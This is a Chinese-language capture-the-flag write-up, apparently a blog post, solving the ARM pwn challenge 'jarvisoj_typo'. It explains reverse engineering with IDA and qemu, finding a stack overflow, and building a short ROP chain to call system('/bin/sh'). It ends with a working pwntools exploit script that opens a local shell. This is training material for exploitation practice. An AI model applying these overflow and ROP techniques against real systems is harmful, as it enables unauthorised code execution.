<font face=汉仪唐美人>上一篇文章中笔者对ARM架构的寄存器和指令集做了简单的介绍，本文就来首杀ARM pwn题。</font>

# <font size=6, face=汉仪唐美人>**buuoj 第139题 jarvisoj_typo**</font>

<font face=汉仪唐美人>这一题是静态编译的程序，对于ARM可执行文件，在x86架构的虚拟机上可以使用``qemu-arm ...``来执行。</font>

<font face=汉仪唐美人>我们首先来执行看一下这个程序有什么输出。</font>

![](https://img-blog.csdnimg.cn/e72c9ff3e6af490fb3e9fb5bf85b2243.png)

<font face=汉仪唐美人>在程序一开始输出了一段字符串，我们可以在IDA中用Shift+F12来查看elf文件中所有硬编码的字符串：</font>

![](https://img-blog.csdnimg.cn/e996f980ef9941099fbbc372fc7f5200.png)

<font face=汉仪唐美人>然后根据交叉引用找到该字符串被引用的位置：</font>

![](https://img-blog.csdnimg.cn/7dd8665411a44b65bdaaabdb115b85f9.png)

<font face=汉仪唐美人>根据程序的输入，我们可以猜测出其中一部分库函数，如这里的write、getchar等。看上去这是一个正常的输入程序，一个typing test，如果输入的内容和程序输出相同就会继续输出一个单词等待用户输入，否则输出error。</font>

![](https://img-blog.csdnimg.cn/f8ca296275374151a59ee4f3e6e18e53.png)

<font face=汉仪唐美人>这里可以推测``sub_8D24``是关键输入函数。</font>

![](https://img-blog.csdnimg.cn/cfd778369edd4f21acb4674afbdfeffb.png)

<font face=汉仪唐美人>这里的input应该就是输入的缓冲区，我们需要进行调试确定到底是哪一步执行了读取用户输入的操作：qemu-arm后加-g选项指定端口，就可以通过``gdb-multiarch``进行调试。经过调试发现上图中的``read``函数就是读取的函数，且最大读取大小为512字节，这明显就造成了栈溢出。</font>

![](https://img-blog.csdnimg.cn/bcfa376ecf864b53bb35c6aff0a411bf.png)

<font face=汉仪唐美人>从上图可知，覆盖返回地址需要先输入0x70字节。在elf文件中可以发现字符串``/bin/sh``:</font>

![](https://img-blog.csdnimg.cn/c1cd7531800d4bbeb88e75c98d414543.png)

<font face=汉仪唐美人>引用字符串``/bin/sh``的函数就是``system``函数。因此我们可以找到``system``函数的地址为0x10BA8。需要注意ARM架构函数的调用约定：<font color=red>前4个参数保存在R0~R3，之后的参数从右至左压栈。因此要想执行``system("/bin/sh")``，就需要将寄存器R0的值修改为字符串``'/bin/sh'``的地址，返回地址可以通过栈溢出直接修改。考虑到这是一个静态编译的文件，很容易就可以想到使用一个简单的ROP来实现寄存器修改操作。<font></font>

![](https://img-blog.csdnimg.cn/378e8f9963554d3d830236b7a57e83b2.png)

<font face=汉仪唐美人>找到合适的ROP地址为0x20904，可以在修改寄存器R0的值之后修改PC的值。现在可以编写exp了。</font>

```python
from pwn import *
context.arch='arm'
context.log_level='debug'

io = process(['qemu-arm-static', './typo'])
io.sendafter(b'quit\n', b'\n')
io.send(cyclic(0x70) + p32(0x20904) + p32(0x6c384) + p32(0) + p32(0x10ba8))

io.interactive()
```

![](https://img-blog.csdnimg.cn/67fef56492dc496c840ced2ad8631fda.png)

<font face=汉仪唐美人>成功getshell。这题看来不难，只是一个简单的不能再简单的ROP。</font>
